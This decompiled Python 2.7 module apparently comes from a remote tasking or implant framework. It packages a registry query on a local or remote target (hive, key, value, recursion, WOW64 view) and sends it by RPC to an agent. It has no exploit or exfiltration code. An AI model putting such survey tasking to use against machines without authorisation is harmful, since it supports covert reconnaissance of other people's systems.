# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_RegistryQuery_Tasking.py
FLAG_USE_WOW_64 = 1
FLAG_USE_WOW_32 = 2

def TaskingMain(namespace):
    import mcl.imports
    import mcl.target
    import mcl.tasking
    import mcl.tasking.technique
    from mcl.object.Message import MarshalMessage
    mcl.imports.ImportWithNamespace(namespace, 'mca.survey.cmd.registryquery', globals())
    mcl.imports.ImportWithNamespace(namespace, 'mca.survey.cmd.registryquery.tasking', globals())
    lpParams = mcl.tasking.GetParameters()
    tgtParams = mca.survey.cmd.registryquery.Params()
    tgtParams.provider = mcl.tasking.technique.Lookup('REGISTRYQUERY', mcl.tasking.technique.TECHNIQUE_MCL_NTNATIVEAPI, lpParams['method'])
    tgtParams.hive = lpParams['hive']
    tgtParams.chunksize = lpParams['chunksize']
    if lpParams['key'] != None:
        tgtParams.key = lpParams['key']
    if lpParams['remote'] != None:
        tgtParams.target = lpParams['remote']
    if lpParams['recursive']:
        tgtParams.flags |= mca.survey.cmd.registryquery.PARAMS_FLAG_RECURSIVE
    if lpParams['wowtype'] == FLAG_USE_WOW_64:
        tgtParams.flags |= mca.survey.cmd.registryquery.PARAMS_FLAG_USE_WOW64_64
    elif lpParams['wowtype'] == FLAG_USE_WOW_32:
        tgtParams.flags |= mca.survey.cmd.registryquery.PARAMS_FLAG_USE_WOW64_32
    if lpParams['value'] != None:
        tgtParams.flags |= mca.survey.cmd.registryquery.PARAMS_FLAG_GET_VALUE
        tgtParams.value = lpParams['value']
    tgtParams.before = lpParams['before']
    tgtParams.after = lpParams['after']
    taskXml = mcl.tasking.Tasking()
    if tgtParams.flags & mca.survey.cmd.registryquery.PARAMS_FLAG_RECURSIVE:
        taskXml.SetRecursive()
    if len(tgtParams.target) > 0:
        taskXml.SetTargetRemote(tgtParams.target)
    else:
        taskXml.SetTargetLocal()
    mcl.tasking.OutputXml(taskXml.GetXmlObject())
    rpc = mca.survey.cmd.registryquery.tasking.RPC_INFO_QUERY
    msg = MarshalMessage()
    tgtParams.Marshal(msg)
    rpc.SetData(msg.Serialize())
    rpc.SetMessagingType('message')
    res = mcl.tasking.RpcPerformCall(rpc)
    if res != mcl.target.CALL_SUCCEEDED:
        mcl.tasking.RecordModuleError(res, 0, mca.survey.cmd.registryquery.errorStrings)
        return False
    else:
        return True


if __name__ == '__main__':
    import sys
    if TaskingMain(sys.argv[1]) != True:
        sys.exit(-1)